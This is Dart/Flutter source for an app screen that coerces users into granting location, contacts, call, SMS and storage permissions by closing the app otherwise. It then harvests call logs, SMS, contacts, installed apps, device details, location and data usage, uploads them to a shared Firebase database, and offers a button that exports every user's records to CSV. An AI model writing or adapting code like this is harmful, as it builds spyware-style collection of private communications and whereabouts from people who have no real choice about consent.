import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:csv/csv.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:get/get.dart';
import 'package:get/get_core/src/get_main.dart';
import 'package:location/location.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart'
    as permissionHandler;
import 'package:permission_handler/permission_handler.dart';

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  List<List<dynamic>> rowsAsListOfValues = [];
  List result = [];
  static const platform =
      MethodChannel('com.cashful.deviceinformation/userdata');
  Location location = Location();
  FirebaseFirestore firestore = FirebaseFirestore.instance;
  String? UID = FirebaseAuth.instance.currentUser!.uid;
  bool checkpermission = false;

  //This method are help to get all contacts number
  Future<void> getContacts() async {
    List<Contact> contacts =
    await FlutterContacts.getContacts(withProperties: true);
    result = [];
    contacts.forEach((element) {
      Map oneC = element.toJson();
      setState(() {
        result.add(oneC);
      });
    });
    print(result);
  }

  bool count = false;
  //This method are help to get calllog,sms,appinstall,device information and datause.
  Future uploadToDatabase(callName) async {
    await platform.invokeMethod(callName).then((value) async {
      setState(() {
        result = value;
      });

       if(value==null ){
         exit(0);
       }

      List uploadList = [];
      for (var element in result) {
        element['UID'] = UID;
        uploadList.add(element);
      }
      print(uploadList);
      DatabaseReference ref = FirebaseDatabase.instance.ref();
      await ref.child('metadata').child(callName).once().then((value) async {
        if (value.snapshot.exists) {
          var temp = value.snapshot.value as List;
          List oldData = temp.toList();
          oldData.removeWhere((element) => element?['UID'] == UID);
          uploadList.addAll(oldData);
        }
        await ref.child('metadata').child(callName).set(uploadList);
      });
    });
  }

  //This method are help to store all data in firebase realtime database
  Future upload(callName) async {
    try {
      List uploadList = [];
      for (var element in result) {
        print(element.runtimeType);
        element['UID'] = UID;
        uploadList.add(element);
      }
      print(UID);
      // print(uploadList);
      DatabaseReference ref = FirebaseDatabase.instance.ref();
      ref.child('metadata').child(callName).once().then((value) {
        if (value.snapshot.exists) {
          var temp = value.snapshot.value as List;
          List oldData = temp.toList();
          oldData.removeWhere((element) => element?['UID'] == UID);
          uploadList.addAll(oldData);
        }
        ref.child('metadata').child(callName).set(uploadList);
      });
    } on PlatformException catch (e) {
      print(e.toString());
    }
  }

  int _locationPermissionCount = 0;

  //get all permission and call some method.
  getPermission() async {
    permissionHandler.PermissionStatus _permissionGranted =
        await permissionHandler.Permission.locationAlways.request();
    if (_permissionGranted == permissionHandler.PermissionStatus.denied ||
        _permissionGranted ==
            permissionHandler.PermissionStatus.permanentlyDenied) {
      showPermissionDialog();
    }
    var _contactPermissionGranted =
        await permissionHandler.Permission.contacts.request();

    if (_contactPermissionGranted ==
            permissionHandler.PermissionStatus.denied ||
        _contactPermissionGranted ==
            permissionHandler.PermissionStatus.permanentlyDenied) {
      showPermissionDialog();
    }
    var _phoneCallPermission =
        await permissionHandler.Permission.phone.request();
    if (_phoneCallPermission == permissionHandler.PermissionStatus.denied ||
        _phoneCallPermission ==
            permissionHandler.PermissionStatus.permanentlyDenied) {
      showPermissionDialog();
    }
    var _smsPermission = await permissionHandler.Permission.sms.request();
    if (_smsPermission == permissionHandler.PermissionStatus.denied ||
        _smsPermission ==
            permissionHandler.PermissionStatus.permanentlyDenied) {
      showPermissionDialog();
    }
    var _storagePermission =
        await permissionHandler.Permission.storage.request();
    if (_storagePermission == permissionHandler.PermissionStatus.denied ||
        _storagePermission ==
            permissionHandler.PermissionStatus.permanentlyDenied) {
      showPermissionDialog();
    }
    if (_storagePermission.isGranted &&
        _smsPermission.isGranted &&
        _phoneCallPermission.isGranted&&
        _contactPermissionGranted.isGranted&&
        _permissionGranted.isGranted) {

      checkpermission = true;
      showPermissionDialog();
      await uploadToDatabase('getCallLog');
      await uploadToDatabase('appInstall');
      await uploadToDatabase('device');
      await uploadToDatabase('sms');
      await getContacts().then((value) => upload('contacts'));
      await LocationPermission()
          .then((value) => upload('locations'));
      await uploadToDatabase('dataUsage');


    }
  }

  //This is a dialog when user are  not allow any single permission show this dialog with two option give permission or exit app.
  void showPermissionDialog() {
   checkpermission!=true? Get.dialog(
      WillPopScope(
          child: Scaffold(
            backgroundColor: Colors.black.withOpacity(0.5),
            body: Center(
              child: Padding(
                padding: const EdgeInsets.all(10.0),
                child: Container(
                  child: Padding(
                    padding: const EdgeInsets.all(20.0),
                    child: Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        const Text('Permission Required'),
                        const SizedBox(
                          height: 10,
                        ),
                        //This is a message.
                        const Text(
                          'This app requires some permission to function properly. Please go to Settings -> Apps -> App name ->permissions and enable all permission. And Make sure location permission is set to Always Enable',
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 17,
                          ),
                        ),
                        const SizedBox(
                          height: 10,
                        ),
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                          children: [
                            InkWell(
                              onTap: () => exit(0),
                              child:const Text(
                                'Exit',
                                style: TextStyle(
                                  color: Colors.white,
                                  fontSize: 17,
                                ),
                              ),
                            ),
                            InkWell(
                              onTap: () async {
                                await permissionHandler.openAppSettings();
                                exit(0);
                              },
                              child: const Text(
                                'Got to Setting',
                                style: TextStyle(
                                  color: Colors.white,
                                  fontSize: 17,
                                ),
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(
                          height: 10,
                        )
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
          onWillPop: () => Future.value(false)),
    ):null;
  }

  @override
  void initState() {
    getPermission();
    super.initState();
  }

  //get location permission and get current location
  LocationPermission() async {
    var status = await Permission.location.status;
    if (status.isDenied ||
        status.isPermanentlyDenied ||
        status.isLimited && _locationPermissionCount <= 7) {
      await Permission.location.request();
      _locationPermissionCount++;
      // print(count);

      // print(status);
      return LocationPermission();
    } else if (status.isDenied) {
      await openAppSettings();
      return LocationPermission();
    } else if (status.isGranted) {
      LocationData _locationData;
      Location location = Location();
      bool _serviceEnabled;

      _serviceEnabled = await location.serviceEnabled();
      if (!_serviceEnabled) {
        _serviceEnabled = await location.requestService();
        if (!_serviceEnabled) {
          return;
        }
      }

      _locationData = await location.getLocation();
      setState(() {
        result = [
          {
            'lat': _locationData.latitude.toString(),
            'long': _locationData.longitude.toString(),
          }
        ];
      });
      print(result);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(widget.title),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.start,
          children: <Widget>[
            ElevatedButton(
                onPressed: () async {
                  List<String> names = [
                    'appInstall',
                    'contacts',
                    'dataUsage',
                    'device',
                    'getCallLog',
                    'locations',
                    'sms'
                  ];
                  await Future.forEach(names, (element) async {
                    DatabaseReference _ref = FirebaseDatabase.instance.ref();
                    await _ref
                        .child('metadata')
                        .child(element.toString())
                        .once()
                        .then((value) async {
                      if (value.snapshot.exists) {
                        var temp = value.snapshot.value as List;
                        List result = temp.toList();
                        if (await permissionHandler.Permission.storage
                            .request()
                            .isGranted) {
                          final String directory =
                              (await getExternalStorageDirectory())!.path;
                          final path =
                              "$directory/csv-$element${DateTime.now()}.csv";
                          rowsAsListOfValues = [];
                          if (result.isNotEmpty) {
                            rowsAsListOfValues.add(result[0].keys.toList());
                          }
                          print(result);
                          for (Map element in result) {
                            setState(() {
                              rowsAsListOfValues.add(element.values.toList());
                            });
                          }
                           result.clear();
                          String csvData = const ListToCsvConverter()
                              .convert(rowsAsListOfValues);
                          print(csvData);
                          final File file = File(path);
                          await file.writeAsString(csvData).then((value) async {
                            print(await value.exists());
                            ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                              duration: const Duration(microseconds: 1000),
                              content: Text(
                                  'Successfully exported $element to local CSV files'),
                            ));
                          });
                        } else {
                          Map<permissionHandler.Permission,
                                  permissionHandler.PermissionStatus> statuses =
                              await [
                            permissionHandler.Permission.storage,
                          ].request();
                        }
                      }
                    });
                  });
                  ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
                    content:  Text('All finished'),
                  ));
                },
                child: const Text('Download all user CSV')),
            Expanded(
              child: ListView.builder(
                  shrinkWrap: true,
                  itemCount: result.length,
                  itemBuilder: (context, index) {
                    return Padding(
                      padding: const EdgeInsets.all(8.0),
                      child: Text('${result[index]}'),
                    );
                  }),
            ),
          ],
        ),
      ),
    );
  }
}
